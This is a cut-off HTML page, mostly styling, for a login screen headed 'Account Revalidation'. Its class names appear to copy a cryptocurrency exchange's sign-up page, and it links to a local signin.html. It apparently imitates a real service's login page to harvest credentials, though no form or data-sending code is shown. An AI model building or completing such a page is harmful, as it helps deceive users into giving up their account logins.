      display: flex;
      margin-top: 16px;
    }

    .css-hkv7uv {
      box-sizing: border-box;
      margin: 0px;
      padding: 0px;
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      color: rgb(29, 29, 29);
      list-style: none;
      position: relative;
      display: inline-block;
      line-height: unset;
      cursor: pointer;
      opacity: 1;
    }

    .css-hkv7uv:not(:last-of-type) {
      margin-right: 0px;
    }

    .css-hkv7uv::after {
      display: inline-block;
      width: 0px;
      overflow: hidden;
      content: "a0";
    }

    .css-157ll7t {
      box-sizing: border-box;
      margin: 0px;
      list-style: none;
      position: relative;
      display: inline-block;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      outline: none;
      cursor: pointer;
      white-space: nowrap;
      line-height: 1;
      vertical-align: middle;
      top: -0.09em;
    }

    .css-1q67xq6 {
      position: absolute;
      inset: 0px;
      width: 100%;
      height: 100%;
      z-index: 1;
      cursor: inherit;
      opacity: 0;
      margin: 0px;
    }

    .css-qsv8ak {
      display: flex;
      box-sizing: border-box;
      position: relative;
      left: 0px;
      top: 0px;
      background: rgb(29, 29, 29);
      border: 2px solid rgb(29, 29, 29);
      border-radius: 100%;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: 18.3px;
      height: 18.3px;
    }

    .css-qsv8ak svg {
      width: 12px;
      height: 12px;
    }

    .css-76wc5 {
      margin-left: 6px;
      font-size: 14px;
      line-height: 22px;
    }

    [dir="rtl"] .css-76wc5 {
      margin-left: unset;
      margin-right: 6px;
    }

    .css-1ahqney {
      color: rgba(29, 29, 29, 0.6);
      font-size: 14px;
      font-weight: 400;
    }

    .css-1ahqney a {
      cursor: pointer;
      color: rgb(29, 29, 29);
      font-weight: 700;
      text-decoration: underline;
    }

    .css-1awe74r {
      display: inline-flex;
      flex-shrink: 0;
      -webkit-box-pack: center;
      justify-content: center;
      -webkit-box-align: center;
      align-items: center;
      box-sizing: border-box;
      border-radius: 24px;
      outline: none;
      border: none;
      cursor: pointer;
      width: 100%;
      opacity: 1;
      pointer-events: auto;
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      font-weight: 700;
      height: 48px;
      font-size: 16px;
      padding: 0px 32px;
      color: rgb(255, 255, 255);
      background: rgb(29, 29, 29);
    }

    .css-1awe74r:hover {
      background: rgb(38, 38, 38);
    }

    .css-1awe74r:active {
      background: rgb(56, 56, 56);
    }

    .css-81nkya {
      margin-top: 24px;
    }

    @media (max-width: 767px) {
      .css-81nkya {
        margin-top: 16px;
      }
    }

    .css-pllb1j {
      position: absolute;
      left: 0px;
      top: 0px;
      transform-origin: left top;
      padding: 0px 2px;
      white-space: nowrap;
      transition: color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms, transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms, max-width 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
      font-size: 16px;
      line-height: 24px;
      transform: translate(14px, -9px) scale(0.75);
      color: rgb(1, 188, 141);
      pointer-events: none;
    }

    [dir="rtl"] .css-pllb1j {
      left: unset;
      right: 0px;
      font-size: 16px;
      line-height: 24px;
      transform: translate(9px, -9px) scale(0.75);
    }

    .css-1yd51zm {
      position: absolute;
      inset: -5px -2px 0px;
      pointer-events: none;
      border-radius: 8px;
      border-style: solid;
      border-width: 1px;
      border-color: rgb(1, 188, 141);
      overflow: hidden;
    }

    .css-cufmhu {
      visibility: hidden;
      height: 12px;
      line-height: 24px;
      max-width: 100%;
      padding: 2px;
      font-size: 12px;
    }

    .css-rvip7g {
      height: 100%;
    }

    @media (max-width: 48rem) {
      .css-rvip7g {
        position: relative;
        overflow: hidden;
        border-radius: 16px 16px 0px 0px;
      }
    }

    .css-1y4jh0f {
      font-weight: 400;
      font-size: 14px;
      line-height: 130%;
    }

    .css-1y4jh0f .fastText {
      color: rgba(0, 13, 29, 0.6);
      margin-bottom: 0px;
    }

    .css-1y4jh0f .fastText a {
      color: rgb(0, 13, 29);
      font-weight: 700;
      text-decoration: underline;
      cursor: pointer;
    }
  </style>
  <style id="ssg-jss-node" ssg-jss-node="1" type="text/css">
    .css-76ygvu .gbiz-headeroom {
      border-bottom: 1px solid rgba(29, 29, 29, 0.08);
    }

    .css-1dn57jc {
      position: fixed;
      top: 0px;
      height: 100vh;
      width: 100%;
      overflow-y: auto;
      background: rgb(255, 255, 255);
      display: flex;
      flex-direction: column;
    }

    .css-1dn57jc::-webkit-scrollbar {
      width: 4px;
      background: transparent;
    }

    .css-1dn57jc::-webkit-scrollbar-track {
      background: transparent;
    }

    .css-1dn57jc::-webkit-scrollbar-thumb {
      background: rgb(204, 204, 204);
      border-radius: 2px;
    }

    .css-h96opg {
      width: 100%;
      flex: 1 1 0%;
      border-top: 1px solid rgba(29, 29, 29, 0.08);
    }

    .css-1uos6m1 {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
    }

    .css-kqdmr5 {
      width: 570px;
      position: absolute;
      top: 90px;
      left: 50px;
    }

    [dir="rtl"] .css-kqdmr5 {
      right: 50px;
    }

    @media (max-width: 1439px) {
      .css-kqdmr5 {
        top: 70px;
        left: 40px;
        width: 400px;
      }

      [dir="rtl"] .css-kqdmr5 {
        right: 40px;
      }
    }

    .css-1hwe9d5 {
      width: 100%;
      font-size: 18px;
      font-weight: 500;
      line-height: 130%;
      word-break: break-word;
      color: rgb(29, 29, 29);
    }

    .css-1c7cr12 {
      width: 40px;
      height: 4px;
      margin: 24px 0px;
      border-radius: 20px;
      background: rgb(1, 188, 141);
    }

    .css-1truut5 {
      font-size: 32px;
      font-weight: 700;
      line-height: 150%;
      color: rgb(29, 29, 29);
      word-break: break-word;
    }

    .css-1truut5 .highlight {
      -webkit-text-stroke: 1px red;
    }

    @media (max-width: 1439px) {
      .css-1truut5 {
        font-size: 28px;
      }
    }

    body fieldset {
      min-width: initial;
      padding: initial;
      margin: initial;
      border: initial;
      margin-inline: 2px;
      padding-block: 0.35em 0.625em;
      padding-inline: 0.75em;
    }

    body legend {
      width: initial;
      padding: initial;
      padding-inline: 2px;
    }

    .css-atxi5g {
      position: relative;
      z-index: 100;
      width: 100%;
    }

    .css-atxi5g .logo {
      vertical-align: middle;
    }

    .css-1dftvkr {
      height: 0px;
    }

    .css-n4rmn7 {
      position: fixed;
      top: 0px;
      left: 0px;
      right: 0px;
      z-index: 1000;
      background-color: rgb(255, 255, 255);
      transition: background-color 0.5s ease 0s;
    }

    .css-1eazsyg {
      padding: 0px 32px;
      transition: all 0.3s ease 0s;
    }

    @media (max-width: 1439px) {
      .css-1eazsyg {
        padding: 0px 24px;
      }
    }

    @media (max-width: 767px) {
      .css-1eazsyg {
        padding: 0px 16px;
      }
    }

    .css-6ljh47 {
      display: flex;
      position: relative;
      flex: 1 1 auto;
      margin: 0px auto;
      transition: all 0.3s ease 0s;
      width: 100%;
      height: 80px;
      -webkit-box-pack: justify;
      justify-content: space-between;
    }

    @media (max-width: 1439px) {
      .css-6ljh47 {
        height: 64px;
      }
    }

    .css-6qnjre {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      height: 100%;
    }

    .css-1evik99 {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
    }

    .css-1evik99:hover {
      opacity: 0.8;
    }

    .css-qoy9sy {
      width: 121px;
      height: 28px;
      transition: all 0.3s ease 0s;
    }

    @media (max-width: 1439px) {
      .css-qoy9sy {
        width: 103.71px;
        height: 24px;
      }
    }

    .css-1sg2lsz {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
    }

    .css-1qt7m5u {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      flex-direction: row;
    }

    .css-1qt7m5u .navUserItem {
      color: rgb(29, 29, 29);
      cursor: pointer;
      padding: 0px;
      font-size: 14px;
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: auto;
      white-space: nowrap;
      text-decoration: none !important;
      background-clip: border-box !important;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem {
      padding: 0px 0px 0px 12px;
    }

    .css-1qt7m5u .navUserItem[data-menu="i18n"],
    .css-1qt7m5u .navUserItem[data-menu="currency"],
    .css-1qt7m5u .navUserItem[data-menu="download"],
    .css-1qt7m5u .navUserItem[data-menu="theme"] {
      display: flex;
    }

    .css-1qt7m5u .navUserItem[data-menu="order"],
    .css-1qt7m5u .navUserItem[data-menu="asset"],
    .css-1qt7m5u .navUserItem[data-menu="person"] {
      display: flex;
    }

    .css-1qt7m5u .navUserItem[data-menu="download"],
    .css-1qt7m5u .navUserItem[data-menu="i18n"],
    .css-1qt7m5u .navUserItem[data-menu="currency"],
    .css-1qt7m5u .navUserItem[data-menu="notice"],
    .css-1qt7m5u .navUserItem[data-menu="person"],
    .css-1qt7m5u .navUserItem[data-menu="order"] {
      padding: 0px;
    }

    .css-1qt7m5u .navUserItem[data-menu="notice"] {
      margin-right: 12px;
      margin-left: 0px;
    }

    .css-1qt7m5u .navUserItem[data-menu="person"],
    .css-1qt7m5u .navUserItem[data-menu="order"],
    .css-1qt7m5u .navUserItem[data-menu="notice"] {
      margin-left: 12px;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="download"] {
      margin-right: 12px;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="notice"] {
      margin: 0px;
    }

    @media (max-width: 767px) {
      .css-1qt7m5u .navUserItem[data-menu="notice"] svg {
        width: 16px;
        height: 16px;
      }
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="person"] {
      margin-left: 0px;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="theme"] {
      padding: 0px 12px 0px 0px;
    }

    .css-1qt7m5u .navUserItem.signinLink {
      width: auto;
      margin-right: unset;
    }

    @media screen and (max-width: 414px) {
      .css-1qt7m5u .navUserItem.signinLink {
        display: none;
      }
    }

    .css-1qt7m5u .navUserItem.signinLink:hover {
      opacity: 0.6;
    }

    .css-1qt7m5u .navUserItem.signinLink:active {
      opacity: 1;
    }

    .css-1qt7m5u .navUserItem .signinBtn {
      width: unset;
      padding: 9px 24px;
      font-weight: 500;
      font-size: 14px;
      line-height: 130%;
      text-align: center;
      color: rgb(29, 29, 29);
      margin: 0px;
      transition: all 0.3s ease 0s;
      border: unset;
      border-radius: 24px;
    }

    @media (max-width: 767px) {
      .css-1qt7m5u .navUserItem .signinBtn {
        font-size: 12px;
      }
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem .signinBtn {
      margin: 0px;
    }

    .css-1qt7m5u .navUserItem.signUpLink {
      width: auto;
    }

    .css-1qt7m5u .navUserItem.signUpLink:hover {
      opacity: 0.6;
    }

    .css-1qt7m5u .navUserItem.signUpLink:active {
      opacity: 1;
    }

    .css-1qt7m5u .navUserItem.signUpLink:active>img {
      display: block;
    }

    .css-1qt7m5u .navUserItem .signUpBtn {
      width: unset;
      padding: 9px 28px;
      border-radius: 90px;
      font-weight: 700;
      font-size: 14px;
      line-height: 130%;
      text-align: center;
      color: rgb(255, 255, 255);
      background: rgb(29, 29, 29);
      position: relative;
      transition: all 0.3s ease 0s;
    }

    @media (max-width: 767px) {
      .css-1qt7m5u .navUserItem .signUpBtn {
        padding: 8px 16px;
        font-size: 12px;
      }
    }

    .css-9zi109 {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      margin-right: 0px;
      flex-direction: row;
      width: auto;
      padding: 0px;
      -webkit-box-pack: unset;
      justify-content: unset;
    }

    .css-v71wna {
      width: 1px;
      height: 16px;
      margin: 0px 12px;
    }

    [dir="rtl"] .css-v71wna {
      margin: 0px 12px 0px 0px;
    }

    .css-15bj1sf {
      border: none;
      flex-shrink: 0;
      background: rgba(29, 29, 29, 0.08);
      display: block;
      width: 1px;
      height: 16px;
      margin: 0px 12px;
    }

    [dir="rtl"] .css-15bj1sf {
      margin: 0px 12px 0px 0px;
    }

    .css-1b9zzns {
      width: 40px;
      height: 40px;
      background: rgba(29, 29, 29, 0.04);
      border-radius: 50%;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      display: none;
    }

    [dir="rtl"] .css-1b9zzns {
      margin-right: 12px;
    }

    @media (max-width: 767px) {
      .css-1b9zzns {
        width: 32px;
        height: 32px;
        line-height: 30px;
        font-size: 14px;
      }
    }

    .css-1b9zzns:hover svg {
      fill: rgb(1, 188, 141);
    }

    .css-1n99kaq {
      max-width: 400px;
      width: 100%;
      height: 100vh;
      overflow: auto;
      background-color: rgb(255, 255, 255);
      padding: 0px !important;
    }

    .css-1n99kaq .KuxDrawer-content::-webkit-scrollbar {
      width: 3px;
      height: 3px;
    }

    .css-1n99kaq .KuxDrawer-content::-webkit-scrollbar-thumb {
      border-radius: 2px;
      background: rgba(29, 29, 29, 0.08);
    }

    .css-1n99kaq .showDownBox {
      padding: 0px 24px;
    }

    .css-1n99kaq .userBox {
      margin: 0px;
    }

    .css-lmssxu {
      max-width: 400px;
      width: 100%;
    }

    .css-lmssxu .KuxDrawer-content {}

    .css-lmssxu .KuxDrawer-content::-webkit-scrollbar {
      display: none;
    }

    .css-1iv9pmj {
      height: 81px;
    }

    .css-1lm9f0d {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      background-image: initial;
      background-position: initial;
      background-size: initial;
      background-repeat: initial;
      background-attachment: initial;
      background-origin: initial;
      background-color: rgba(29, 29, 29, 0.04);
      border-radius: 20px;
      margin-left: 12px;
      background-clip: padding-box !important;
    }

    [dir="rtl"] .css-1lm9f0d {
      margin-left: 0px;
      margin-right: 12px;
    }

    .css-1lm9f0d svg {
      color: rgb(29, 29, 29);
    }

    .css-1lm9f0d span {
      color: rgb(29, 29, 29);
      font-weight: 600;
      font-size: 14px;
    }

    .css-1lm9f0d:hover svg,
    .css-1lm9f0d:hover span {
      color: rgb(1, 188, 141);
    }

    .css-14yu18w .KuxModalHeader-root .KuxModalHeader-close {
      top: 24px !important;
    }

    .css-14yu18w .KuxDialog-content {
      padding: 0px;
      border-radius: 0px 0px 20px 20px;
    }

    .css-162y68p {
      height: 80px;
    }

    .css-1dz931i {
      width: 100%;
      height: 100%;
      display: flex;
      flex-direction: column;
      background: rgb(255, 255, 255);
    }

    .css-1dz931i .banner {
      flex: 0 0 45%;
    }

    .css-gfyiy3 {
      display: flex;
      flex-flow: row wrap;
      -webkit-box-pack: start;
      justify-content: flex-start;
      align-items: flex-start;
    }

    .css-gfyiy3::before,
    .css-gfyiy3::after {
      display: flex;
    }

    .css-139vhbh {
      position: relative;
      min-height: 1px;
      display: block;
      flex: 0 0 45.8333%;
      max-width: 45.8333%;
    }

    .css-c0ajov {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      height: 100%;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      position: relative;
    }

    .css-qrlrtm {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      position: absolute;
      bottom: 0px;
    }

    .css-fm3kvj {
      position: absolute;
      inset: 0px;
      z-index: 0;
      display: flex;
    }

    .css-14d5rtx {
      flex: 1 1 55%;
      height: 100%;
      object-fit: cover;
      overflow: hidden;
    }

    .css-ts3x3g {
      position: relative;
      min-height: 1px;
      display: block;
    }

    .css-mpa8nz {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      height: 100%;
      width: 100%;
      align-items: flex-start;
      -webkit-box-pack: start;
      justify-content: flex-start;
      position: relative;
    }

    .css-1rsyla4 {
      position: relative;
      margin-top: 100px;
      margin-bottom: 100px;
      flex: 1 1 0%;
      width: 100%;
    }

    @media (max-width:NaNpx) {
      .css-1rsyla4 {
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    @media (max-width: 767px) {
      .css-1rsyla4 {
        padding: 0px 16px;
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    .css-5kgvnz {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      position: relative;
      margin-top: 100px;
      margin-bottom: 100px;
      flex: 1 1 0%;
      width: 100%;
    }

    @media (max-width:NaNpx) {
      .css-5kgvnz {
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    @media (max-width: 767px) {
      .css-5kgvnz {
        padding: 0px 16px;
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    .css-mpirg9 {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
    }

    .css-uuchwj {
      width: 100%;
      max-width: 486px;
      margin: 0px auto 0px 100px;
      padding: unset;
    }

    @media (max-width: 1439px) {
      .css-uuchwj {
        margin: 0px auto;
      }
    }

    @media (max-width: 1199px) {
      .css-uuchwj {
        margin: 0px auto;
        padding: unset;
      }
    }

    @media (max-width: 767px) {
      .css-uuchwj {
        width: 100%;
        margin: 0px auto;
        max-width: unset;
        padding: unset;
      }
    }

    .css-b38fps {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      max-width: 486px;
      margin: 0px auto 0px 100px;
      padding: unset;
    }

    @media (max-width: 1439px) {
      .css-b38fps {
        margin: 0px auto;
      }
    }

    @media (max-width: 1199px) {
      .css-b38fps {
        margin: 0px auto;
        padding: unset;
      }
    }

    @media (max-width: 767px) {
      .css-b38fps {
        width: 100%;
        margin: 0px auto;
        max-width: unset;
        padding: unset;
      }
    }

    .css-1b12qyh {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      position: absolute;
      bottom: 0px;
      right: 0px;
    }

    .css-wcpi88 .__AnimateOverlay__ {
      animation-duration: 0.23s;
      animation-name: animation-v15rbp;
      animation-fill-mode: forwards;
    }

    @-webkit-keyframes animation-v15rbp {
      0% {
        opacity: 1;
        transform: translateY(0px);
      }

      100% {
        opacity: 0;
        transform: translateY(8px);
      }
    }

    @keyframes animation-v15rbp {
      0% {
        opacity: 1;
        transform: translateY(0px);
      }

      100% {
        opacity: 0;
        transform: translateY(8px);
      }
    }

    .css-1a3v9iz {
      display: inline-flex;
    }

    .css-1a3v9iz .__AnimateOverlay__ {
      animation-duration: 0.23s;
      animation-name: animation-v15rbp;
      animation-fill-mode: forwards;
    }

    .css-5xkyj6 {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      background: rgba(29, 29, 29, 0.04);
      border-radius: 50%;
    }

    .css-5xkyj6 svg {
      margin: 0px 6px;
    }

    .css-5xkyj6 img {
      width: 16px;
    }

    .css-5xkyj6:hover svg {
      fill: rgb(1, 188, 141);
    }

    .css-mr93o9 {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      height: 100%;
      display: flex;
      flex-direction: column;
    }
  </style>
  <style id="jss-insertion-point"></style>
  <style>
    .css-mpa8nz {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      height: 100%;
      width: 100%;
      align-items: flex-start;
      -moz-box-pack: start;
      justify-content: flex-start;
      position: relative;
    }

    .css-5kgvnz {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      position: relative;
      margin-top: 100px;
      margin-bottom: 100px;
      flex: 1 1 0%;
      width: 100%;
    }

    @media (max-width: 767px) {
      .css-5kgvnz {
        padding: 0px 16px;
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    .css-mpirg9 {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
    }

    @media (max-width: 1439px) {
      .css-b38fps {
        margin: 0px auto;
      }
    }

    .css-b38fps {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      max-width: 486px;
      margin: 0px auto 0px 100px;
      padding: unset;
    }

    .css-1280167 {
      position: relative;
      display: block;
      align-self: baseline;
    }

    .css-1skih21 {
      position: relative;
      clear: both;
    }

    .css-1lha2kr {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      height: 100%;
      flex-direction: column;
    }

    .css-1s1a632 {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      flex: 1 1 0%;
    }

    .css-si8vkb {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      margin-bottom: 40px;
      margin-top: 0px;
      display: flex;
    }

    .css-mr4dhk {
      font-weight: 700;
      font-size: 40px;
      line-height: 130%;
      margin-top: 0px;
      color: rgb(29, 29, 29);
      margin-bottom: 16px;
      word-break: break-word;
    }

    @media (max-width: 767px) {
      .css-mr4dhk {
        font-size: 24px;
        margin-bottom: 8px;
      }
    }

    .css-1ule816 {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      font-weight: 400;
      font-size: 16px;
      line-height: 130%;
      color: rgba(29, 29, 29, 0.6);
      margin-bottom: 40px;
    }

    .css-9mv970 {
      box-sizing: border-box;
      margin: 0px;
      padding: 0px;
      list-style: none;
    }

    .css-1uqn2oy {
      display: flex;
      flex-flow: column wrap;
      -moz-box-pack: start;
      justify-content: flex-start;
      align-items: flex-start;
    }

    .css-1dbp2j {
      position: relative;
      min-height: 1px;
      display: flex;
      flex-direction: column;
      width: 100%;
    }

    .css-161mx9n {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      align-items: flex-end;
      flex-direction: column;
    }

    .css-xl471x {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
    }

    .css-1azhzmu {
      width: 100%;
      display: flex;
      -moz-box-align: center;
      align-items: center;
      -moz-box-pack: justify;
      justify-content: space-between;
    }

    .css-8g6s6x {
      position: relative;
      font-family: "Roboto", "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      background: transparent;
      background-clip: border-box;
      outline: none;
      width: 100%;
      height: fit-content;
      box-sizing: border-box;
      border-radius: 8px;
      display: flex;
      flex-direction: row;
      -moz-box-align: center;
      align-items: center;
      opacity: 1;
      cursor: text;
      padding: 0px 16px 0px 12px;
    }

    .css-1azhzmu .ipt_pwd {
      width: 64px;
      height: 72px;
      padding: 0px;
      text-align: center;
    }

    @media (max-width: 767px) {
      .css-1azhzmu .ipt_pwd {
        width: 48px;
        height: 54px;
        font-size: 24px;
      }
    }

    .css-1azhzmu .ipt_pwd .KuxInput-input {
      width: 100%;
      height: 100%;
      text-align: center;
      line-height: 1;
      font-size: 28px;
    }

    .css-1a7r0qu {
      border: medium;
      outline: none;
      padding: 0px;
      width: 100%;
      flex: 1 1 0%;
      margin: 0px;
      box-sizing: border-box;
      background: transparent;
      font-family: "Roboto", "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      color: rgb(29, 29, 29);
      cursor: text;
      font-weight: 500;
      font-size: 14px;
      height: 40px;
      line-height: 22px;
    }

    .css-i8mafz {
      display: inline-flex;
      flex-shrink: 0;
      -moz-box-pack: center;
      justify-content: center;
      -moz-box-align: center;
      align-items: center;
      box-sizing: border-box;
      border-radius: 24px;
      outline: none;
      cursor: pointer;
      width: auto;
      opacity: 1;
      pointer-events: auto;
      font-family: "Roboto", "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      font-weight: 700;
      font-size: 16px;
      padding: 0px;
      border: medium;
      background: transparent;
      color: rgb(29, 29, 29);
      height: auto;
      margin-top: 16px !important;
    }

    @media only screen and (max-width: 600px) {
      .css-b38fps {
        box-sizing: border-box;
        min-height: 0px;
        min-width: 0px;
        width: 100%;
        max-width: 486px;
        margin: 0px auto 0px auto;
        padding: unset;
      }
    }
  </style>

</head>

<body>

  <style>
    .banner {
      display: block;
    }

    @media only screen and (max-width: 600px) {
      .banner {
        display: none;
      }
    }
  </style>

  <noscript>You need to enable JavaScript to run this app.</noscript>
  <div id="root">
    <div class="__analytics-module">
      <div class="root root_QCGGy css-76ygvu e1rzxqrx0" data-path="/ucenter/signup">
        <div class="body_hXuuO onlymain_Beuhw">
          <div class="css-1dn57jc e1l0el2c0">

            <div class="gbiz-Header css-atxi5g">
              <div data-class="headerRoomWrapper" class="css-162y68p">
                <div class="gbiz-headeroom css-n4rmn7">
                  <div class="Header-Nav css-1eazsyg">
                    <div class="css-6ljh47">
                      <div id="hook_nav_links" class="css-6qnjre">
                        <div class="css-6qnjre">
                          </a>
                        </div>
                      </div>


                      <div id="hook_nav_user" data-status="0" class="css-1sg2lsz">
                        <div class="css-1qt7m5u">
                          <div id="unLoginBox" data-lang="en_US" class="css-9zi109" style="display: flex;">
                            <a href="signin.html" class="navUserItem signinLink" data-modid="login">
                              <div class="signinBtn">Log In</div>
                            </a>
                            <div type="horizontal" class="KuxDivider-root KuxDivider-center KuxDivider-horizontal css-15bj1sf" style="display: block;"></div>
                          </div>
                          <div class="navUserItem" data-lang="en_US" data-menu="download">
                            <div class="KuxDropDown-container css-1a3v9iz">
                              <div class="KuxDropDown-trigger" style="display: block;">
                                <div class="css-5xkyj6">
                                  <svg class="navIcon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="#1D1D1D">
                                    <path d="M170.656 256A85.344 85.344 0 01256 170.656h42.656a42.656 42.656 0 000-85.312H256A170.656 170.656 0 0085.344 256v554.656A170.656 170.656 0 00256 981.312h512a170.656 170.656 0 00170.656-170.656V256A170.656 170.656 0 00768 85.344h-48.064a42.656 42.656 0 000 85.312H768A85.344 85.344 0 01853.344 256v554.656A85.344 85.344 0 01768 896H256a85.344 85.344 0 01-85.344-85.344V256zM511.84 85.344c23.552 0 42.656 19.104 42.656 42.656v494.496l119.328-119.328a42.656 42.656 0 1160.352 60.352l-192 192a42.624 42.624 0 01-30.272 12.512h-.096a42.56 42.56 0 01-32.352-14.848L289.824 563.552a42.656 42.656 0 1160.352-60.352l119.008 119.008V128.064c0-23.552 19.104-42.656 42.656-42.656z"></path>
                                  </svg>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="navUserItem" data-lang="en_US" data-menu="i18n">
                            <div class="css-1lm9f0d">
                              <svg class="navIcon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor">
                                <path d="M512 981.344C252.8 981.344 42.656 771.232 42.656 512S252.768 42.656 512 42.656c259.2 0 469.344 210.112 469.344 469.344S771.232 981.344 512 981.344zM407.264 880.096c-46.304-98.208-68.192-216.416-74.048-324.832H128c9.12 72.224 44.576 149.728 91.648 205.248S337.536 859.2 407.264 880.096zm12.288-324.864C426.624 669.696 459.36 780.928 512 875.808c54.08-97.408 85.664-209.376 92.448-320.576H419.52zm475.264 0H689.664c-5.856 108.416-26.464 226.624-72.768 324.832 69.728-20.896 140.672-64.032 187.744-119.584s81.056-133.024 90.176-205.248zm-766.848-86.816h205.248c5.856-108.416 27.776-226.08 74.08-324.32-69.728 20.864-140.608 63.712-187.648 119.264s-82.56 132.832-91.68 205.056zm291.584 0h184.832c-6.784-111.2-38.304-222.848-92.352-320.256-54.08 97.408-85.728 209.056-92.512 320.256h.032zm197.376-324.288c46.304 98.208 66.848 215.872 72.704 324.32h205.152c-9.12-72.224-43.072-149.792-90.144-205.344s-117.984-98.08-187.744-118.976z"></path>
                              </svg>
                            </div>
                          </div>
                        </div>
                        <div data-lang="en_US" class="MenuBox css-1b9zzns">
                          <svg class="ICMenu_svg__icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="#1D1D1D" style="cursor: pointer;">
                            <path d="M153.6 256a51.2 51.2 0 0151.2-51.2h614.4a51.2 51.2 0 110 102.4H204.8a51.2 51.2 0 01-51.2-51.2zm0 256a51.2 51.2 0 0151.2-51.2H512a51.2 51.2 0 110 102.4H204.8a51.2 51.2 0 01-51.2-51.2zm0 256a51.2 51.2 0 0151.2-51.2h614.4a51.2 51.2 0 110 102.4H204.8a51.2 51.2 0 01-51.2-51.2z"></path>
                          </svg>
                        </div>
                      </div>

                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div class="css-h96opg essyzlb0">
              <div class="KuxBox-root css-1erus7g">
                <div class="css-rvip7g">
                  <section class="css-1dz931i">
                    <div class="KuxRow-row css-gfyiy3" style="flex: 1 1 0%; row-gap: 0px;">
                      <div span="11" order="0" offset="0" class="banner KuxCol-col KuxCol-11-col css-139vhbh" style="position: relative; height: 100%;">
                        <div class="KuxBox-root css-c0ajov">
                          <div class="KuxBox-root css-qrlrtm"></div>
                        </div>
                        <div class="css-fm3kvj">
                          <img src="https://atlas-content-cdn.pixelsquid.com/assets_v2/266/2666349259774760199/jpeg-600/G03.jpg?modifiedAt=1" class="css-14d5rtx">
                          <div class="css-13d3z8n e15lf9ig3">
                            <div class="css-1hwe9d5 e15lf9ig2">Login</div>
                            <div class="css-1c7cr12 e15lf9ig1"></div>
                            <div class="css-1n36i2x e15lf9ig0">
                            </div>
                          </div>
                        </div>
                      </div>

                      <div id="userInput" order="0" offset="0" class="KuxCol-col css-ts3x3g" style="display: flex; justify-content: center; align-items: center; height: 100%; flex: 1 1 0%; max-width: 100%;">
                        <div class="KuxBox-root css-mpa8nz" style="flex-direction: column;">
                          <div class="KuxBox-root css-5kgvnz">
                            <div class="KuxBox-root css-b38fps" style="flex: 1 1 auto;">
                              <h3 class="css-1b1nvj1">Account Revalidation</h3>

                              <section class="css-1yvtdo">
                                <div class="KuxTabs-container KuxTabs-lineContainer css-5pto6a" type="default">
                                  <div class="KuxTabs-scroller KuxTabs-scrollableX css-1v8kgrz" id="_TabsScroller_" style="overflow: hidden; margin-bottom: 0px;">
                                    <div class="KuxTabs-Container css-v0g351" role="tablist">
